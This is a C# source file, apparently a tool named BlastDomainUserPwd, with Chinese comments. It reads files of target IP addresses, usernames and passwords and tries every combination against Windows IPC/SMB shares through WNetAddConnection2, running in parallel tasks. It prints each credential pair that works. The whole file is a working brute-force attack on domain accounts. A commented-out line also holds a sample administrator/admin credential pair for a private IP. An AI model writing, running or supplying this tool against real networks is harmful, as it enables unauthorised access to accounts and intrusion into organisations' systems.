using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading;
using System.Threading.Tasks;

namespace BlastDomainUserPwd
{
    // 新建windows网络控制类
    class WNetHandler
    {
        // 建立IPC连接
        public static int WNetAddConnect2(string lpRemoteName,string lpDomainUsername,string lpPassword)
        {
            win32.NETRESOURCE netResource = new win32.NETRESOURCE();
            netResource.dwType = 0; // RESOURCETYPE_ANY
            netResource.lpLocalName = "";
            netResource.lpRemoteName = lpRemoteName ;
            netResource.lpProvider = "";
            netResource.lpComment = "";
            var dwRetVal = win32.WNetAddConnection2(ref netResource, lpPassword, lpDomainUsername, 0);
            if (dwRetVal == 0)
            {
                Console.WriteLine("[OK] [{0}] /u:{1}  {2}", netResource.lpRemoteName, lpDomainUsername,lpPassword);
                return 1;
            }else if(dwRetVal == 67)
            {
                //Console.WriteLine("[+] {0} network name could not be found.", netResource.lpRemoteName);
                return 0;
            }else if (dwRetVal == 1326)
            {
                //Console.WriteLine("[+] {0} username or password is incorrect.", netResource.lpRemoteName);
                return 0;
            }else if (dwRetVal == 53) // 53表示网络不存在
            {
                return 2;
            }
            else // 其他错误
            {
                //Console.WriteLine("[+] {0} connection has error {1}", netResource.lpRemoteName, dwRetVal);
                return 0;
            }
        }
        public static int WNetCancelConnect(string lpRemoteName)
        {
            var dwRetVal = win32.WNetCancelConnection2(lpRemoteName, 0, true);
            if (dwRetVal == 0)
            {
                return 1; //删除成功
            }
            else
            {
                return 0;
            }
        }
    }
    // 文件操作类
    class FileHandler
    {
        // 读取指定文件路径并返回一个string列表
        public static string[] FileLines(string path)
        {
            // 尝试打开文件
            string[] lines = null;
            try
            {
                lines = File.ReadAllLines(path);
                return lines;
            }
            catch(FileNotFoundException e)
            {
                Console.WriteLine(e.Message);
                return lines;
            }
        }
    }

    class Program
    {
        // 网络连接
        public static bool WNetConnect(string lpRemoteName, string lpDomainUsername, string lpPassword)
        {
            try
            {
                var status = WNetHandler.WNetAddConnect2(lpRemoteName, lpDomainUsername, lpPassword);
                if (status == 1)
                {
                    WNetHandler.WNetCancelConnect(lpRemoteName);
                    // 连接成功
                    return true;
                }
                WNetHandler.WNetCancelConnect(lpRemoteName);
                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                return false;
            }
        }
        public static void BlastMainLoop(string ip,string userdic,string passdic)
        {
            if (ip != "" && userdic != "" && passdic != "")
            {
                string[] users = FileHandler.FileLines(userdic);
                string[] pass = FileHandler.FileLines(passdic);
                if (users.Length > 0 && pass.Length > 0)
                {
                    // 这里我们循环user和pass来爆破
                    foreach (string u in users)
                    { 
                        FuzzPassword(ip, u, pass);
                    }
                }
            }
        }

        public static void FuzzPassword(string host,string user,string[] pass) 
        {
            foreach (string p in pass)
            {
                WNetConnect(@"\\" + host, user, p); // 尝试连接
            }
        }

        static void Main(string[] args)
        {

            //WNetConnect(@"\\192.168.248.197", "administrator","admin");
            if (args.Length != 3)
            {
                Console.WriteLine("BlastDomainUserPwd.exe [ip.txt] [user.txt] [pass.txt]");
                return;
            }
            else
            {
                // 读取ip列表
                string[] ips = FileHandler.FileLines(args[0]);
                if (ips.Length > 0)
                {
                    List<Task> taskList = new List<Task>();
                    foreach (string ip in ips)
                    {
                        taskList.Add(Task.Factory.StartNew(() => BlastMainLoop(ip, args[1], args[2])));
                    }
                    Task.WaitAll(taskList.ToArray());
                }
            }
            
        }

    }
}
